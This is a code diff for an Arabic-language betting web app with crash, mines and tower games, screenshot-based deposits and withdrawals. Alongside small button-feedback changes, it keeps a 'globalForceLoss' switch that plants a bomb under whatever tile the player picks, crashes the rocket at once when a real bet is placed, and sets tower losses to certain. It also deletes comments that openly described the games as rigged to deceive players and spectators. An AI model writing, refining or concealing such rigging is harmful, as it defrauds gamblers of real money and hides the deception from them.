@@ -106,7 +106,7 @@
                     <span class="text-[10px] text-slate-500 block mb-1">مبلغ الرهان</span>
                     <input type="number" id="cBet" value="10" class="bg-transparent w-full font-black text-xl outline-none text-center">
                 </div>
-                <button id="cBtn" onclick="games.crash.handleAction()" class="bg-blue-600 rounded-2xl font-black text-xl shadow-lg">رهان</button>
+                <button id="cBtn" onclick="games.crash.handleAction()" class="bg-blue-600 rounded-2xl font-black text-xl shadow-lg transition">رهان</button>
             </div>
         </div>
 
@@ -189,7 +189,7 @@
                 <input type="file" id="depImage" class="hidden" accept="image/*">
             </label>
             <p id="uploadStatus" class="text-[10px] text-green-500 text-center mb-2 hidden">تم تجهيز الصورة بنجاح ✓</p>
-            <button onclick="account.deposit()" class="w-full bg-green-600 py-4 rounded-xl font-black shadow-lg">تأكيد الطلب</button>
+            <button id="depositBtnAction" onclick="account.deposit()" class="w-full bg-green-600 py-4 rounded-xl font-black shadow-lg transition duration-300">تأكيد الطلب</button>
         </div>
     </div>
 
@@ -322,11 +322,39 @@
                 const phone = document.getElementById('depPhone').value;
                 if(amount < 15 || !phone || !base64Image) return alert("يرجى ملء البيانات بشكل صحيح ورفع صورة السكرين");
 
-                await set(push(ref(db, 'deposits')), {
-                    uid: currentUser.uid, name: currentUserData.name, email: currentUser.email, 
-                    amount: amount, phone: phone, receiptBase64: base64Image, status: 'pending', timestamp: Date.now()
-                });
-                alert("تم إرسال طلب الإيداع بنجاح!"); ui.hideModal('depositModal');
+                const btn = document.getElementById('depositBtnAction');
+                btn.innerText = "جاري الرفع...";
+                btn.disabled = true;
+                btn.classList.replace('bg-green-600', 'bg-slate-600');
+
+                try {
+                    await set(push(ref(db, 'deposits')), {
+                        uid: currentUser.uid, name: currentUserData.name, email: currentUser.email, 
+                        amount: amount, phone: phone, receiptBase64: base64Image, status: 'pending', timestamp: Date.now()
+                    });
+                    
+                    btn.innerText = "تم انشاء طلب الايداع بنجاح ✓";
+                    btn.classList.replace('bg-slate-600', 'bg-blue-600');
+                    
+                    setTimeout(() => {
+                        ui.hideModal('depositModal');
+                        btn.innerText = "تأكيد الطلب";
+                        btn.classList.replace('bg-blue-600', 'bg-green-600');
+                        btn.disabled = false;
+                        document.getElementById('depAmount').value = '';
+                        document.getElementById('depPhone').value = '';
+                        document.getElementById('uploadStatus').classList.add('hidden');
+                        base64Image = null;
+                    }, 2000);
+                } catch (error) {
+                    btn.innerText = "حدث خطأ، حاول مجدداً";
+                    btn.classList.replace('bg-slate-600', 'bg-red-600');
+                    setTimeout(() => {
+                        btn.innerText = "تأكيد الطلب";
+                        btn.classList.replace('bg-red-600', 'bg-green-600');
+                        btn.disabled = false;
+                    }, 2000);
+                }
             },
             async withdraw() {
                 const amount = parseFloat(document.getElementById('withAmount').value);
@@ -335,7 +363,6 @@
                 if(!amount || amount < 50 || !phone) return alert("الحد الأدنى للسحب هو 50 جنيه مع كتابة الرقم");
                 if(amount > currentUserData.balance) return alert("رصيدك الحالي غير كافٍ لإتمام عملية السحب!");
 
-                // سحب فوري من رصيد العميل في الداتا بيز لحماية المنصة
                 const updatedBalance = currentUserData.balance - amount;
                 await update(ref(db, 'users/' + currentUser.uid), { balance: updatedBalance });
 
@@ -445,7 +472,6 @@
                     this.bet = amt; this.mult = 1.0; this.safePicks = 0; this.active = true;
                     this.bombs = [];
 
-                    // في الوضع الطبيعي بنحط قنبلتين عشوائيتين عشان اللعبة تشتغل طبيعي
                     let bombCount = 2; 
                     while(this.bombs.length < bombCount) { let r = Math.floor(Math.random() * 25); if(!this.bombs.includes(r)) this.bombs.push(r); }
                     
@@ -456,7 +482,6 @@
                     if(!this.active) return; const box = document.getElementById(`mb_${index}`);
                     if(box.classList.contains('revealed')) return; box.classList.add('revealed');
                     
-                    // تعديلك الذكي: لو وضع الخسارة شغال، بنزرع القنبلة تحت صباعه فوراً في نفس المربع اللي ضغط عليه
                     if(globalForceLoss) {
                         if(!this.bombs.includes(index)) this.bombs.push(index);
                     }
@@ -488,7 +513,6 @@
                         if(this.sys.status === 'RUNNING') {
                             this.sys.mult += 0.01 * (1 + (this.sys.mult - 1) * 0.4);
                             
-                            // تعديلك الذكي للطيارة: مش هتبان إنها بتخسر دايماً، هطير عادي جداً، لكن لو هو دخل الدور بفلوسه والوضع شغال هتفرقع فوراً
                             if(globalForceLoss && this.myBet > 0 && !this.cashed) {
                                 this.sys.target = 1.00; 
                             }
@@ -501,7 +525,6 @@
                 },
                 resetSys() {
                     this.sys.status = 'WAITING'; this.sys.mult = 1.00;
-                    // الطيارة بتاخد دايماً أرقام طبيعية وعالية عشان تخدع المتفرجين ومتبانش إنها خسرانة
                     const r = Math.random();
                     if(r < 0.15) this.sys.target = 1.00; 
                     else if(r < 0.75) this.sys.target = 1.2 + Math.random() * 2.5; 
@@ -513,10 +536,14 @@
                     const el = document.getElementById('crash_mult'); const msg = document.getElementById('crash_msg'); const btn = document.getElementById('cBtn');
                     if(this.sys.status === 'WAITING') {
                         el.innerText = "WAITING"; el.style.color = "white"; msg.innerText = "تجهيز الجولة...";
-                        if(!this.myBet) { btn.innerText = "رهان"; btn.className = "bg-blue-600 rounded-2xl font-black text-xl shadow-lg"; btn.disabled = false; }
+                        if(!this.myBet) { btn.innerText = "رهان"; btn.className = "bg-blue-600 rounded-2xl font-black text-xl shadow-lg transition"; btn.disabled = false; }
                     } else if(this.sys.status === 'RUNNING') {
                         el.innerText = this.sys.mult.toFixed(2) + "x"; el.style.color = "#3b82f6"; msg.innerText = "الصاروخ يحلق!";
-                        if(this.myBet && !this.cashed) { btn.innerText = "سحب " + (this.myBet * this.sys.mult).toFixed(2); btn.className = "bg-orange-500 text-black rounded-2xl font-black text-xl shadow-lg"; }
+                        if(this.myBet && !this.cashed) { 
+                            btn.innerText = "سحب " + (this.myBet * this.sys.mult).toFixed(2); 
+                            btn.className = "bg-orange-500 text-black rounded-2xl font-black text-xl shadow-lg transition"; 
+                            btn.disabled = false; // هنا تم حل المشكلة، الزرار أصبح متاح للضغط والسحب
+                        }
                     } else {
                         el.innerText = "BOOM"; el.style.color = "#ef4444"; msg.innerText = "انفجر الصاروخ!";
                         if(this.myBet && !this.cashed) { this.myBet = 0; }
@@ -559,7 +586,6 @@
                 async pick(r, c) {
                     if(!this.active || r !== this.level) return;
                     
-                    // لو وضع الخسارة شغال بيطلعله قنبلة فوراً 100%
                     let bombChance = globalForceLoss ? 1.0 : (this.level < 3 ? 0.35 : 0.55);
                     const isBomb = Math.random() < bombChance;
                     const cell = document.getElementById(`ar_${r}`).children[c];
